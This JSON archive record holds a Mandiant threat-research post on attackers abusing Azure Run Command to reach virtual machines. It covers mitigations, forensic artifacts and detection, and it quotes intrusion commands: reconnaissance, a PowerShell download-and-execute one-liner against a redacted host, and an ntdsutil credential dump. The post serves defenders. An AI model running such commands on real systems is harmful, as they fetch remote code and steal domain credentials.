{
    "id": "6ba3077e-b20a-4c6b-b26f-ec860662a901",
    "created_at": "2023-01-12T15:05:12.542145Z",
    "updated_at": "2025-03-27T02:16:39.985549Z",
    "deleted_at": null,
    "sha1_hash": "8a306c979afa199b3fb357b0a4f2dffcfb88842f",
    "title": "2021-12-14 - Azure Run Command for Dummies",
    "authors": "",
    "file_creation_date": "2022-05-27T21:17:14Z",
    "file_modification_date": "2022-05-27T21:17:14Z",
    "file_size": 3171111,
    "plain_text": "# Azure Run Command for Dummies\n\n**mandiant.com/resources/azure-run-command-dummies**\n\nBlog\n\nAdrien Bataille, Anders Vejlby, Jared Scott Wilson, Nader Zaveri\n\nDec 14, 2021\n\n12 mins read\n\nThreat Research\n\nDetection\n\nHunting\n\nResponse\n\nTTPs\n\n[In Mandiant’s recent blog post, we detailed suspected Russian intrusion activity that targeted managed services providers](https://www.mandiant.com/resources/russian-targeting-gov-business)\n(MSP) to gain access to their customers’ cloud environments. Other companies, such as Microsoft, have observed\n[similarly targeted activity against customers of several cloud and managed service providers.One notable technique from](https://blogs.microsoft.com/on-the-issues/2021/10/24/new-activity-from-russian-actor-nobelium/)\nthese intrusions is the use of Azure Run Commands to move laterally from managed hypervisors to the MSP customers’\nunderlying virtual machines.\n\nThis latest blog post comes as a supplementary annex to highlight Azure Run Commands and provide guidance for\nmitigations, hunting, and detection mainly from the perspective of the virtual machines at risk from this type of activity. As\nother blog posts have focused on Azure logs and permissions and what can be learned from these sources, here we will\nfocus more on what can be learned from the evidence sources inside the virtual machines themselves.\n\n\n-----\n\nThis method of pivoting from Azure to the underlying virtual machines (VMs) is significant for a couple of reasons:\n\nAn Azure account compromise could result in granting full access to underlying Virtual Machines, even when those\nsystems are segmented on the virtual layer.\nRunning commands through Azure means there is an easy route for elevated privilege execution, without worrying\nabout connectivity and authorization at the virtual layer.\n\nIn most cases, the final goal of the attacker is related to the virtual level and not the hypervisor. For example, an attacker\nis likely interested in stealing information residing inside the virtual systems or encrypting the data and individual systems\nthemselves. While a hypervisor level compromise may allow attackers to circumvent many host-level detection and\nresponse mechanisms, there are still opportunities to identify attackers as they pursue their mission objectives.\n\n## Azure Run Commands\n\nThe Azure Run Command feature enables administrators to run commands on Azure Windows or Linux virtual machines\nby leveraging the virtual machine agent. The agent is installed by default on Windows and Linux virtual machines\ndeployed from an Azure Marketplace image but can be disabled.\n\nAzure Run Commands are well documented on the Microsoft website at the following locations:\n\n[Run scripts in your Windows VM by using action Run Commands](https://docs.microsoft.com/en-us/azure/virtual-machines/windows/run-command)\n[Run scripts in your Linux VM by using action Run Commands](https://docs.microsoft.com/en-us/azure/virtual-machines/linux/run-command)\n\nAzure administrators can run them using the Azure Portal user interface, the API, PowerShell, or the Azure command line\ninterface; each of which will be demonstrated as follows. Each operating system has distinct command types that support\narbitrary script execution on virtual machines.\n\nOn Windows, the RunPowerShellScript command executes PowerShell on the virtual machine as the SYSTEM\nuser.\nOn Linux, the RunShellScript command executes a shell script on the virtual machine as the root user.\n\nThese command types must be supplied via the “command-id” parameter when using the Run Command feature.\n\n### Via Azure Portal\n\nFigure 1 shows two commands ‘w’ and ‘whoami’ sent to our Linux virtual machine using the Azure Portal web console.\n\n\n-----\n\nFigure 1: Azure run commands\n\ntowards a Linux host\n\n### Via Azure CLI\n\nAdministrators can execute a PowerShell script by name using the following Azure CLI command.\n```\n az vm run-command invoke --command-id RunPowerShellScript --name winvm -g resourcegroup --scripts\n @myscript.ps1 --parameters \"arg1=firstarg\"\n\n```\nAzure CLI also accepts individual commands, such as in the following example using the Linux VM “RunShellScript”\nmodule.\n```\n az vm run-command invoke -g resourcegroup -n linuxvm --command-id RunShellScript --scripts \"uname\n -a\"\n\n### Via the REST API\n\n```\nThe Azure REST API’s runCommand endpoint accepts HTTP POST requests such as the following, with required\nparameters, defined in the POST request body.\n```\n https://management.azure.com/subscriptions/{subscriptionId}/re\n sourceGroups/{resourceGroupName}/providers/Microsoft.Compute/v\n irtualMachines/{vmName}/runCommand?api-version=2021-07-01\n\n### Via PowerShell Cmdlet\n\n```\nThe Azure PowerShell cmdlet also includes a command for Azure Run Commands. Note that the proper Azure Context\nneeds to be provided either by running the Connect-AzAccount command or using the -Context parameter.\n\n\n-----\n\n```\n Invoke-AzVMRunCommand -ResourceGroupName 'resourcegroup' -Name 'winvm' -CommandId\n 'RunPowerShellScript' -ScriptPath 'myscript.ps1'\n\n```\n_Invoke-AzVMRunCommand returns a PSRunCommandResult object with the script results in the “Message” field. In_\nFigure 2, the results contain “nt authority\\system”, because the script executed a single whoami command.\n\nFigure 2: Azure run commands\n\nvia PowerShell\n\n## Mitigations\n\n### Limiting Run Command Access\n\nAs [documented by Microsoft, executing Run Commands requires](https://docs.microsoft.com/en-us/azure/virtual-machines/windows/run-command)\nthe Microsoft.Compute/virtualMachines/runCommand/ permission. The Virtual Machine Contributor role and higher levels\nhave this permission. The Virtual Machine Contributor role has the ability to manage the virtual machines but are not\nallowed to access the virtual machine, storage account, and virtual network it resides in. Performing regular Azure\npermissions audits or limiting the number of users with this permission would reduce the attack surface of accounts that\ncan execute Run Commands.\n\nAn organization can perform an audit of the Virtual Machine Contributor role or other high-level roles with the following\nPowerShell command.\n```\n Get-AzureRmRoleAssignment | ? {$_.RoleDefinitionName -eq 'Virtual Machine Contributor'} | ft\n RoleDefinitionName, UserPrincipalName, DisplayName\n\n```\nSince we are mainly concerned with the permission that allow for Azure RunCommand usage, the following script queries\nall built-in and custom roles created within Azure that contain the specific RunCommand permission.\n\n\n-----\n\n```\nimport sys\n\n```\n```\nfrom azure.identity import DefaultAzureCredential\n\n```\n```\nfrom azure.mgmt.authorization import AuthorizationManagementClient\n\n```\n```\nif len(sys.argv) < 2:\n\n```\n```\n  print(\"You need to supply the permission to search for\")\n\n```\n```\n  sys.exit(1)\n\n```\n```\ncredential = DefaultAzureCredential()\n\n```\n```\nclient = AuthorizationManagementClient(\n\n```\n```\n  credential=credential,\n\n```\n```\n  subscription_id=\"YOUR_SUBSCRIPTION_ID\"\n\n```\n```\n)\n\n```\n```\ndesired_action = sys.argv[1]\n\n```\n```\ndesired_action_lower = desired_action.lower()\n\n```\n```\ndesired_action_wildcard = \"/\".join(desired_action_lower.split(\"/\")[:-1] + [\"*\"])\n\n```\n```\nrole_definitions = list(client.role_definitions.list(scope=\"\"))\n\n```\n```\nfor role_def in client.role_definitions.list(scope=\"\"):\n\n```\n```\n  for permission in role_def.permissions:\n\n```\n```\n    for action in permission.actions:\n\n```\n```\n      if action.lower() == desired_action_lower or action.lower() ==\ndesired_action_wildcard:\n\n```\n```\n        print(f\"Role '{role_def.role_name}' contains {action}\")\n\n```\n\nAfter an organization has identified all roles that have the ability to execute Run Commands on Virtual Machines, then it\ncan use the previous PowerShell script to obtain the individual users or groups that have said permission. Mandiant\nrecommends having regular entitlement reviews of this and other high-risk permissions with Azure.\n\n### Create a Custom Just-in-Time (JIT) Administrative Role for Run Command Permissions\n\nAnother method to mitigate the risk and reducing the attack surface of this potential attack is by creating a Just-in-Time\n(JIT) administrative role that contains the Run Command permissions needed to perform legitimate run command-like\nactions on a virtual machine. By creating this custom role, we remove the need for a user to have persistent Run\nCommand capabilities on Virtual Machines.\n\nThe following sample PowerShell script creates a custom JIT Run Command role for a prescribed subscription and\nresource group (Note: Replace the subscriptionid and resourcegroupname with the desired organization’s subscription\nand resource group).\n\n\n-----\n\n```\n$role = Get-AzRoleDefinition \"Virtual Machine Contributor\"\n\n```\n```\n$role.Id = $null\n\n```\n```\n$role.Name = \"Run Command JIT Permissions\"\n\n```\n```\n$role.Description = \"Can request JIT for Run Command actions on virtual machines.\"\n\n```\n```\n$role.Actions.Clear()\n\n```\n```\n$role.Actions.Add(\"Microsoft.Compute/virtualMachines/runCommand/*\")\n\n```\n```\n$role.AssignableScopes.Clear()\n\n```\n```\n$role.AssignableScopes.Add(\"/subscriptions/{subscriptionid}/resourceGroups/{resourcegroupname}/\")\n\n```\n```\nNew-AzRoleDefinition -Role $role\n\n```\n```\n$scope=\"/subscriptions/{subscriptionid}/resourceGroups/{resourcegroupname}/\"\n\n```\n```\n New-AzRoleAssignment -ObjectId {AD Group Object Id} -RoleDefinitionName \"JIT Virtual Machine Run\n Command Role\" -Scope $scope\n\n```\nAfter the custom JIT role has been made, Mandiant recommends assigning the JIT Role to a newly created Azure AD\nGroup, and then managing the access to the newly created group using Azure Privileged Identity Management (PIM).\n\n### Removing the VM agent\n\nThe most basic task that can be performed to mitigate this functionality is to remove the agent from the underlying VM,\nhowever, this may have serious consequences to how the virtual machine is administrated.\n\nAlso, it is important to note that by doing so, you are not removing the attacker’s access to the hypervisor level, and they\nmay have other means to steal your data or compromise hosts.\n\nBy removing the agent, you are also removing the main means that you can leverage for detecting this feature being used\non your virtual machines. For example, if an attacker runs a command from the Azure CLI, you can detect this with proper\ndetections in place. But if the attacker creates a snapshot of your system, this will be undetected. Therefore, it is critical to\nperform risk analysis to determine how to best proceed. Removing the agent entirely would eliminate a potential vector for\nthe adversary to abuse but would also push the attacker away from your line of sight.\n\nThe references at the following locations provide commands to remove the Windows and Linux agents:\n\n[Troubleshooting Windows Azure Guest Agent](https://docs.microsoft.com/en-us/troubleshoot/azure/virtual-machines/windows-azure-guest-agent)\n[Disable or remove the Linux Agent from VMs and images](https://docs.microsoft.com/en-us/azure/virtual-machines/linux/disable-provisioning)\n\n## Malicious Run Command Usage in the Wild\n\nMandiant has directly observed commands such as the following while conducting incident response investigations.\nThese commands were executed in several different scripts and showcase an almost full chain of activity from\nreconnaissance to malicious code execution and credential harvesting.\n\n\n-----\n\n```\n#Reconnaissance\n\n```\n```\nGet-Process\n\n```\n```\nGet-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct\n\n```\n```\n(Get-Aduser -Filter *).Count\n\n```\n```\n(Get-Aduser -Filter *)[500]\n\n```\n```\nGet-MpComputerStatus\n\n```\n```\nGet-AdDomainController -Discover\n\n```\n```\ncmd /c whoami; ls C:\\\nls \"C:\\Program Files\"\n\n```\n```\nGet-Process | Select -First 25\n\n```\n```\n#Code Execution\n\n```\n```\nC:\\Windows\\syswow64\\windowspowershell\\v1.0\\powershell.exe -C \"iex((New-Object\nsystem.net.webclient).downloadstring(<redacted>))\"\n\n```\n```\nWrite-Host (New-Object System.Net.WebClient).DownloadString(\"http://<redacted>.com\")\n\n```\n```\n#Credential Harvesting\n\n```\n```\nntdsutil.exe 'ac i ntds' 'ifm' 'create full C:\\Temp\\t' q q\n\n```\n\nAs we can see from the aforementioned examples, while Run Command usage may be relatively novel, the commands\nbeing executed represent known attacker techniques and methodologies. This means traditional detection logic for\nsuspicious commands will still be valid, but these mechanisms can be augmented with the context that they were\nexecuted using the Run Command feature.\n\n## Detection and Hunting\n\n### Forensic Artifacts and File Paths\n\nDetection and Hunting on the affected virtual machines should use a combination of forensic artifacts and logs and differ\nbetween Windows and Linux virtual machines.\n\n**Windows Virtual Machines**\n\nOn Windows, the use of the RunPowerShellScript functionality will create related PowerShell logs depending on your\nlogging policy. As such, any typical rules written for malicious activity leveraging these logs or process will provide alerts\nas normal. For additional resources on generic PowerShell logging, see the Mandiant post, “Greater Visibility Through\nPowerShell Logging”.\n\nHowever, in our testing of a default Azure setup, the Azure Activity Log showed that Run Command functionality was used\nbut did not log the contents of the actual script being pushed to the virtual machine for execution. This means that by\ndefault logs will show that a Run Command action was performed but not the commands executed within the script.\n\nOn Windows virtual machines, the PowerShell scripts are downloaded to the following directory, where the <version\nnumber> varies and the <job number> is incremented starting at 0:\n```\n C:\\Packages\\Plugins\\Microsoft.CPlat.Core.RunCommandWindows\\<version number>\\Downloads\\script<job\n number>.ps1.\n\n```\n\n-----\n\nFigure 3: Contents of the file\n\nscript0.ps1\nResults for Run Command jobs are stored in a status file, with the following path/naming convention:\n```\n C:\\Packages\\Plugins\\Microsoft.CPlat.Core.RunCommandWindows\\<version number>\\Status\\<job\n number>.status.\n\n```\nFigure 4: Directory listing showing\n\noutput files from run-commands\nFigure 5 shows the contents of a status file for a successful script execution with the various script outputs logged in\nJSON format. These have valuable additional forensic information such as the execution timestamp.\n\nFigure 5: Contents of a standard\n\nlog file showing the output and metadata of a \"whoami\" command\n\n**Linux Virtual Machines**\n\nOn Linux, Azure Run Command creates a directory per job in: /var/lib/waagent/run-command/download/<job number>.\nEach job directory contains three files: script.sh, stderr, and stdout.\n\nFigure 6: Contents of the\n\n/var/lib/waagent/run-command/download directory\n\n\n-----\n\nThe file script.sh contains the command executed on the host; stderr contains the standard error; and stdout contains the\nresult.\n\nFigure 7: Contents of script.sh\n\nand stdout files\nThese output files have less metadata than their Windows counterpart, but additional details are recorded in the following\nlocation: /var/log/azure/run-command/handler.log. This log includes basic metadata such as the date/time of run\ncommand executions, but it does not include the script contents or results.\n\nFigure 8: Sample contents of\n\n/var/log/azure/run-command/handler.log\nCommands that failed will also be logged in this file, such as the excerpt shown in Figure 9.\n\nFigure 9: Sample contents of\n\n/var/log/azure/run-command/handler.log\n\n### Identifying Process Anomalies\n\n**Windows Virtual Machines**\n\nRunPowerShellScript activity creates a very distinct process tree under the WindowsAzureGuestAgent.exe process.\nFigure 10 shows the processes created after execution of whoami using RunPowerShellScript.\n\nFigure 10: Process tree under\n\nWindowsAzureGuestAgent.exe as an execution of \"whoami\" is performed\nWith the parent/child relationship detection, engineers can create rules to detect commands, which may not be suspicious\non their own, but would rarely be run through the aforementioned process tree. For example, whoami.exe may be\ncommon and benign in most cases, but suspicious if launched as a child of powershell -ExecutionPolicy Unrestricted -File\n_script.ps1, which would indicate potential reconnaissance. Commands with commonly malicious usage, such as_\n_ntdsutil.exe, should be of high concern if seen as a child process of WindowsAzureGuestAgent.exe._\n\nIf any usage of RunPowerShellScript is suspicious in your organization, you can monitor any sub-processes of\nWindowsAzureGuestAgent and whitelist commands as needed for legitimate management activity.\n\nIn addition to process anomalies, you can monitor file creation/modification events in the directories used by Azure Run\nCommands. If your monitoring solution logs the full file content for these events, it will show the actual commands being\nexecuted which can also be reviewed for malicious commands or anomalous usage.\n\n**Linux Virtual Machines**\n\nOn Linux, Azure run commands can be detected by looking for command lines such as the following:\n```\n nohup /var/lib/waagent/Microsoft.CPlat.Core.RunCommandLinux-1.0.2/bin/run-command-extension\n enable\n\n```\n\n-----\n\nFurthermore, parent child relationships can be used to hunt for suspicious processes that have a parent process\ncommand line following this syntax:\n\n```\n/bin/sh -c /var/lib/waagent/run-command/download/3/script.sh\n\n```\n\nSimilar to Windows, file monitoring solutions can be used to trigger alerts on file creations in the /var/lib/waagent/runcommand/download directory, and match suspicious content if this is feasible.\n\n### Azure-Level Detection and Hunting\n\nIn the Azure Portal, the Activity Logs for each VM will capture Azure Run Command executions. Azure Activity Logs can\nbe found in numerous locations, depending on the environment, including but not limited to an Azure Sentinel instance,\nMicrosoft Defender Advanced Hunting, a Log Analytics Workspace, or on the VM Azure Portal page itself.\n\nThe following is an example alert for a Run Command action. This log shows that the “runCommand” for the virtual\nmachine named testvm (1) was actioned and successfully executed via the user@contoso[.]com (2) account from IP\naddress 127.0.0[.]1 (3).\n\n\n-----\n\n```\n{\n\n```\n```\n  \"authorization\": {\n\n```\n```\n    \"action\": \"Microsoft.Compute/virtualMachines/runCommand/\",\n\n```\n```\n  },\n\n```\n```\n(2) \"caller\": \"user@contoso.com\",\n\n```\n```\n  \"claims\": {\n\n```\n```\n(3) \"ipaddr\": \"127.0.0.1\"\n\n```\n```\n},\n\n```\n```\n  \"category\": {\n\n```\n```\n    \"value\": \"Administrative\",\n\n```\n```\n    \"localizedValue\": \"Administrative\"\n\n```\n```\n  },\n\n```\n```\n  \"eventTimestamp\": \"2021-10-28T20:25:33.5505986Z\",\n\n```\n```\n  \"operationName\": {\n\n```\n```\n    \"value\": \"Microsoft.Compute/virtualMachines/runCommand/\",\n\n```\n```\n    \"localizedValue\": \"Run Command on Virtual Machine\"\n\n```\n```\n  },\n\n```\n```\n  \"resourceProviderName\": {\n\n```\n```\n    \"value\": \"Microsoft.Compute\",\n\n```\n```\n    \"localizedValue\": \"Microsoft.Compute\"\n\n```\n```\n  },\n\n```\n```\n  \"resourceType\": {\n\n```\n```\n    \"value\": \"Microsoft.Compute/virtualMachines\",\n\n```\n```\n    \"localizedValue\": \"Microsoft.Compute/virtualMachines\"\n\n```\n```\n  },\n\n```\n```\n(1) \"resourceId\": \"/subscriptions/6d356a32-8ac0-4541-b9583304b11b7447/resourceGroups/[resourcegroupname]/providers/Microsoft.Compute/virtualMachines/testvm\",\n\n```\n```\n  \"status\": {\n\n```\n```\n    \"value\": \"Succeeded\",\n\n```\n```\n    \"localizedValue\": \"Succeeded\"\n\n```\n```\n  }\n\n```\n```\n}\n\n```\n\nUnfortunately, Activity Logs do not include the command that was executed which would be required for further\ninvestigation. Regardless, these logs can be helpful to create baselines of expected Run Command usage in an\nenvironment to find anomalous and suspicious activity.\n\nThe goal of this blog post was to focus especially on the virtual machine side of this activity, and Microsoft has already\n[provided excellent guidance on hunting for suspicious Azure Run Commands in your tenant.](https://techcommunity.microsoft.com/t5/microsoft-sentinel-blog/investigating-suspicious-azure-activity-with-microsoft-sentinel/ba-p/2985699)\n\n## Conclusion\n\n\n-----\n\nAs shown in our recent post, hypervisor level compromises afford threat actors with many opportunities for rapidly and\nstealthily exploiting hosted systems and applications. In this blog post, we discussed how one such method, Azure Run\nCommand, is being leveraged by attackers and how defenders can hunt for, detect, and mitigate malicious usage of it.\n\nHypervisor compromises yield a high level of access to hosted systems and data, which are commonly an attacker’s\nprimary objective in an intrusion. This evolution of intrusion methodology requires a thorough understanding of built-in\ncloud asset management functionality that can be abused by attackers. More importantly, this activity reinforces the need\nfor comprehensive visibility and a vigilance for anomalous activity within environments.\n\n## MITRE ATT&CK\n\nAbusing the hypervisor to virtual machine interaction via Azure Run Commands can lead to full lifecycle adversary\ninteraction including all stages of ATT&CK. However, the ATT&CK Tactics and Techniques observed include but are not\nlimited to:\n\nInitial Access            External Remote Services (T1133)\n\nInitial Access            Valid Accounts (T1078)\n\nExecution              Command and Scripting Interpreter (T1059)\n\nPersistence             External Remote Services (T1133)\n\nPersistence             Valid Accounts (T1078)\n\nPrivilege Escalation      Valid Accounts (T1078)\n\nDefense Evasion (TA0005)\n\n## Acknowledgments\n\nThe authors would like to thank Alyssa Rahman and Matthew Dunwoody for their valuable feedback and technical review.\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-12-14 - Azure Run Command for Dummies.pdf"
    ],
    "report_names": [
        "2021-12-14 - Azure Run Command for Dummies.pdf"
    ],
    "threat_actors": [
        {
            "id": "b43e5ea9-d8c8-4efa-b5bf-f1efb37174ba",
            "created_at": "2022-10-25T16:07:24.36191Z",
            "updated_at": "2025-03-27T02:02:10.1909Z",
            "deleted_at": null,
            "main_name": "UNC2452",
            "aliases": [
                "Dark Halo",
                "Nobelium",
                "SolarStorm",
                "StellarParticle",
                "UNC2452"
            ],
            "source_name": "ETDA:UNC2452",
            "tools": [],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "70872c3a-e788-4b55-a7d6-b2df52001ad0",
            "created_at": "2023-01-06T13:46:39.18401Z",
            "updated_at": "2025-03-27T02:00:03.01553Z",
            "deleted_at": null,
            "main_name": "UNC2452",
            "aliases": [
                "DarkHalo",
                "StellarParticle",
                "NOBELIUM",
                "Solar Phoenix",
                "Midnight Blizzard"
            ],
            "source_name": "MISPGALAXY:UNC2452",
            "tools": [
                "SNOWYAMBER",
                "HALFRIG",
                "QUARTERRIG"
            ],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "1d3f9dec-b033-48a5-8b1e-f67a29429e89",
            "created_at": "2022-10-25T15:50:23.739197Z",
            "updated_at": "2025-03-27T02:00:55.536417Z",
            "deleted_at": null,
            "main_name": "UNC2452",
            "aliases": [
                "UNC2452",
                "NOBELIUM",
                "StellarParticle",
                "Dark Halo"
            ],
            "source_name": "MITRE:UNC2452",
            "tools": [
                "Sibot",
                "Mimikatz",
                "Cobalt Strike",
                "AdFind",
                "GoldMax"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "2864e40a-f233-4618-ac61-b03760a41cbb",
            "created_at": "2023-12-01T02:02:34.272108Z",
            "updated_at": "2025-03-27T02:02:10.209072Z",
            "deleted_at": null,
            "main_name": "WildCard",
            "aliases": [],
            "source_name": "ETDA:WildCard",
            "tools": [
                "RustDown",
                "SysJoker"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "a241a1ca-2bc9-450b-a07b-aae747ee2710",
            "created_at": "2024-06-19T02:03:08.150052Z",
            "updated_at": "2025-03-27T02:05:17.409596Z",
            "deleted_at": null,
            "main_name": "IRON RITUAL",
            "aliases": [
                "Blue Dev 5 ",
                "BlueBravo ",
                "Cloaked Ursa ",
                "CozyLarch ",
                "Dark Halo ",
                "Midnight Blizzard ",
                "NOBELIUM ",
                "StellarParticle ",
                "UNC2452 ",
                "APT29"
            ],
            "source_name": "Secureworks:IRON RITUAL",
            "tools": [
                " Cobalt Strike",
                " EnvyScout",
                " GoldFinder",
                " GoldMax",
                " NativeZone",
                " RAINDROP",
                " SUNBURST",
                " Sibot",
                " TEARDROP",
                " VaporRage",
                "Brute Ratel C4"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "20d3a08a-3b97-4b2f-90b8-92a89089a57a",
            "created_at": "2022-10-25T15:50:23.548494Z",
            "updated_at": "2025-03-27T02:00:55.49688Z",
            "deleted_at": null,
            "main_name": "APT29",
            "aliases": [
                "APT29",
                "IRON RITUAL",
                "IRON HEMLOCK",
                "NobleBaron",
                "Dark Halo",
                "NOBELIUM",
                "UNC2452",
                "YTTRIUM",
                "The Dukes",
                "Cozy Bear",
                "CozyDuke",
                "SolarStorm",
                "Blue Kitsune",
                "UNC3524",
                "Midnight Blizzard"
            ],
            "source_name": "MITRE:APT29",
            "tools": [
                "PinchDuke",
                "ROADTools",
                "WellMail",
                "CozyCar",
                "Mimikatz",
                "Tasklist",
                "OnionDuke",
                "FatDuke",
                "POSHSPY",
                "EnvyScout",
                "SoreFang",
                "GeminiDuke",
                "GoldMax",
                "FoggyWeb",
                "SDelete",
                "PolyglotDuke",
                "AADInternals",
                "MiniDuke",
                "SeaDuke",
                "Sibot",
                "RegDuke",
                "CloudDuke",
                "GoldFinder",
                "AdFind",
                "PsExec",
                "NativeZone",
                "Systeminfo",
                "ipconfig",
                "Impacket",
                "Cobalt Strike",
                "PowerDuke",
                "QUIETEXIT",
                "HAMMERTOSS",
                "BoomBox",
                "CosmicDuke",
                "WellMess",
                "VaporRage",
                "LiteDuke"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "46b3c0fc-fa0c-4d63-a38a-b33a524561fb",
            "created_at": "2023-01-06T13:46:38.393409Z",
            "updated_at": "2025-03-27T02:00:02.822155Z",
            "deleted_at": null,
            "main_name": "APT29",
            "aliases": [
                "The Dukes",
                "Minidionis",
                "Grizzly Steppe",
                "G0016",
                "Blue Kitsune",
                "BlueBravo",
                "SeaDuke",
                "Cloaked Ursa",
                "YTTRIUM",
                "ATK7",
                "Nobelium",
                "UAC-0029",
                "Group 100",
                "COZY BEAR",
                "IRON HEMLOCK",
                "TA421",
                "ITG11"
            ],
            "source_name": "MISPGALAXY:APT29",
            "tools": [
                "QUARTERRIG",
                "SNOWYAMBER",
                "HALFRIG"
            ],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "f27790ff-4ee0-40a5-9c84-2b523a9d3270",
            "created_at": "2022-10-25T16:07:23.341684Z",
            "updated_at": "2025-03-27T02:02:09.74554Z",
            "deleted_at": null,
            "main_name": "APT 29",
            "aliases": [
                "APT 29",
                "ATK 7",
                "Blue Dev 5",
                "BlueBravo",
                "Cloaked Ursa",
                "CloudLook",
                "Cozy Bear",
                "Dark Halo",
                "Earth Koshchei",
                "Grizzly Steppe",
                "Group 100",
                "ITG11",
                "Iron Hemlock",
                "Iron Ritual",
                "Midnight Blizzard",
                "Minidionis",
                "Nobelium",
                "NobleBaron",
                "Operation Ghost",
                "Operation Office monkeys",
                "Operation StellarParticle",
                "SilverFish",
                "Solar Phoenix",
                "SolarStorm",
                "StellarParticle",
                "TEMP.Monkeys",
                "The Dukes",
                "UNC2452",
                "UNC3524",
                "Yttrium"
            ],
            "source_name": "ETDA:APT 29",
            "tools": [
                "7-Zip",
                "ATI-Agent",
                "AdFind",
                "Agentemis",
                "AtNow",
                "BEATDROP",
                "BotgenStudios",
                "CEELOADER",
                "Cloud Duke",
                "CloudDuke",
                "CloudLook",
                "Cobalt Strike",
                "CobaltStrike",
                "CosmicDuke",
                "Cozer",
                "CozyBear",
                "CozyCar",
                "CozyDuke",
                "Danfuan",
                "EnvyScout",
                "EuroAPT",
                "FatDuke",
                "FoggyWeb",
                "GeminiDuke",
                "Geppei",
                "GoldFinder",
                "GoldMax",
                "GraphDrop",
                "GraphicalNeutrino",
                "GraphicalProton",
                "HAMMERTOSS",
                "HammerDuke",
                "LOLBAS",
                "LOLBins",
                "LiteDuke",
                "Living off the Land",
                "MagicWeb",
                "Mimikatz",
                "MiniDionis",
                "MiniDuke",
                "NemesisGemina",
                "NetDuke",
                "OnionDuke",
                "POSHSPY",
                "PinchDuke",
                "PolyglotDuke",
                "PowerDuke",
                "QUIETEXIT",
                "ROOTSAW",
                "RegDuke",
                "Rubeus",
                "SNOWYAMBER",
                "SPICYBEAT",
                "SUNSHUTTLE",
                "SeaDaddy",
                "SeaDask",
                "SeaDesk",
                "SeaDuke",
                "Sharp-SMBExec",
                "SharpView",
                "Sibot",
                "Solorigate",
                "SoreFang",
                "TinyBaron",
                "WINELOADER",
                "WellMail",
                "WellMess",
                "cobeacon",
                "elf.wellmess",
                "reGeorg",
                "tDiscoverer"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "256a6a2d-e8a2-4497-b399-628a7fad4b3e",
            "created_at": "2023-11-30T02:00:07.299845Z",
            "updated_at": "2025-03-27T02:00:03.257794Z",
            "deleted_at": null,
            "main_name": "WildCard",
            "aliases": [],
            "source_name": "MISPGALAXY:WildCard",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        }
    ],
    "ts_created_at": 1673535912,
    "ts_updated_at": 1743041799,
    "ts_creation_date": 1653686234,
    "ts_modification_date": 1653686234,
    "files": {
        "pdf": "https://archive.orkl.eu/8a306c979afa199b3fb357b0a4f2dffcfb88842f.pdf",
        "text": "https://archive.orkl.eu/8a306c979afa199b3fb357b0a4f2dffcfb88842f.txt",
        "img": "https://archive.orkl.eu/8a306c979afa199b3fb357b0a4f2dffcfb88842f.jpg"
    }
}